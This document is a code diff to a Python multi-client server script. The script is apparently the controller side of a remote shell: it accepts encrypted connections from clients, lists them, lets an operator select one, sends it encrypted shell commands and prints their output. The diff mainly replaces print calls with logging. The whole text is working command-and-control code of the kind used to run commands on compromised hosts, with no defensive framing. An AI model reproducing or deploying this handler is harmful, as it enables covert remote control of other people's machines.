@@ -5,9 +5,12 @@ import struct
 import sys
 import threading
 import time
+import logging
 from queue import Queue
 
 from cryptography.fernet import Fernet
+
+logging.basicConfig(level=logging.CRITICAL)
 
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
@@ -52,7 +55,7 @@ class MultiServer(object):
                 conn.shutdown(2)
                 conn.close()
             except Exception as e:
-                print('Could not close connection %s' % str(e))
+                logging.error('Could not close connection %s' % str(e))
                 # continue
         self.socket.close()
         sys.exit(0)
@@ -61,7 +64,7 @@ class MultiServer(object):
         try:
             self.socket = socket.socket()
         except socket.error as msg:
-            print("Socket creation error: " + str(msg))
+            logging.error("Socket creation error: " + str(msg))
             # TODO: Added exit
             sys.exit(1)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -73,7 +76,7 @@ class MultiServer(object):
             self.socket.bind((self.host, self.port))
             self.socket.listen(5)
         except socket.error as e:
-            print("Socket binding error: " + str(e))
+            logging.error("Socket binding error: " + str(e))
             time.sleep(5)
             self.socket_bind()
         return
@@ -91,7 +94,7 @@ class MultiServer(object):
                 client_hostname = self.Crypt.decrypt(conn.recv(1024)).decode()
                 address = address + (client_hostname,)
             except Exception as e:
-                print('Error accepting connections: %s' % str(e))
+                logging.error('Error accepting connections: %s' % str(e))
                 # Loop indefinitely
                 continue
             self.all_connections.append(conn)
@@ -107,7 +110,6 @@ class MultiServer(object):
                 self.list_connections()
                 continue
             elif 'select' in cmd:
-                # self.list_connections()
                 target, conn = self.get_target(cmd)
                 if conn is not None:
                     self.send_target_commands(target, conn)
@@ -149,12 +151,12 @@ class MultiServer(object):
         try:
             target = int(target)
         except:
-            print('Client index should be an integer')
+            logging.warning('Client index should be an integer')
             return None, None
         try:
             conn = self.all_connections[target]
         except IndexError:
-            print('Not a valid selection')
+            logging.warning('Not a valid selection')
             return None, None
         print("You are now connected to " + str(self.all_addresses[target][2]))
         return target, conn
@@ -198,7 +200,9 @@ class MultiServer(object):
                 cmd = input()
                 if len(str.encode(cmd)) > 0:
                     conn.send(self.Crypt.encrypt(cmd.encode()))
-                    cmd_output = self.Crypt.decrypt(self.read_command_output(conn))
+                    received = self.read_command_output(conn)
+                    logging.debug(f'"{received}"')
+                    cmd_output = self.Crypt.decrypt(received)
                     client_response = str(cmd_output, "utf-8")
                     print(client_response, end="")
                 if cmd == 'quit':
